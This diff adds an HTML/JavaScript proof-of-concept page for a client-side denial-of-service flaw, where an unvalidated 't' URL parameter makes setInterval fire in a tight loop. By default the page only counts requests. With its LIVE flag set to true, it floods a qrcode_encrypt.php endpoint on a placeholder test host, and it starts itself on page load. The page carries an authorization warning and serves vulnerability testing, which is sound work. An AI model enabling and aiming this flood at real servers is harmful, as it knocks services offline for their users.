@@ -1,0 +1,70 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>t-param DoS PoC (safe harness)</title>
+  <style>
+    body{font-family:system-ui,Arial,sans-serif;margin:2rem;line-height:1.5}
+    #count{font-size:2rem;font-weight:bold}
+    .warn{color:#b00;font-size:.9rem}
+    button{padding:.5rem 1rem;margin-right:.5rem}
+  </style>
+</head>
+<body>
+  <h2>Client-side DoS PoC — unvalidated <code>t</code> parameter</h2>
+  <p class="warn">Run only against a host you are authorized to test. This harness
+  counts how often <code>changeQRcode()</code> would fire for a given <code>t</code>;
+  it does NOT hammer a real server unless you point TARGET at one and flip LIVE to true.</p>
+
+  <p>Requests that <em>would</em> be sent in the elapsed window:
+     <span id="count">0</span></p>
+  <p>Effective interval delay (ms): <span id="delay">?</span></p>
+
+  <button onclick="start()">Start</button>
+  <button onclick="stop()">Stop</button>
+
+  <script>
+    // ---- config -------------------------------------------------------
+    const TARGET = 'http://TESTVM:8000';   // your OWN test VM only
+    const LIVE   = false;                  // false = count only, no real requests
+    // -------------------------------------------------------------------
+
+    // Mirror the app's parsing exactly: raw, undecoded, no validation.
+    function get_param() {
+      const arr = {};
+      const tmp = location.search.substring(1);
+      if (!tmp) return arr;
+      tmp.split('&').forEach(p => { const kv = p.split('='); arr[kv[0]] = kv[1]; });
+      return arr;
+    }
+
+    // Reproduce the vulnerable line: delay = param.t * 1000, no guard.
+    const param = get_param();
+    const delay = param.t * 1000;          // NaN / 0 / negative all collapse to a tight loop
+    document.getElementById('delay').textContent = String(delay);
+
+    let n = 0, timer = null;
+
+    function changeQRcode() {
+      n++;
+      document.getElementById('count').textContent = n;
+      if (LIVE) {
+        // what the real page does: force a GET via an <img> src
+        const img = new Image();
+        img.src = TARGET + '/qrcode_encrypt.php?act=qrcode_generate&ip='
+                + (param.ip || '1.1.1.1') + '&time=' + Date.now();
+      }
+    }
+
+    function start() {
+      stop();
+      // setInterval with NaN/0 behaves like the smallest allowed delay → flood
+      timer = window.setInterval(changeQRcode, delay);
+    }
+    function stop() { if (timer) { clearInterval(timer); timer = null; } }
+
+    // auto-start so simply opening ?t=0 demonstrates the effect
+    start();
+  </script>
+</body>
+</html>
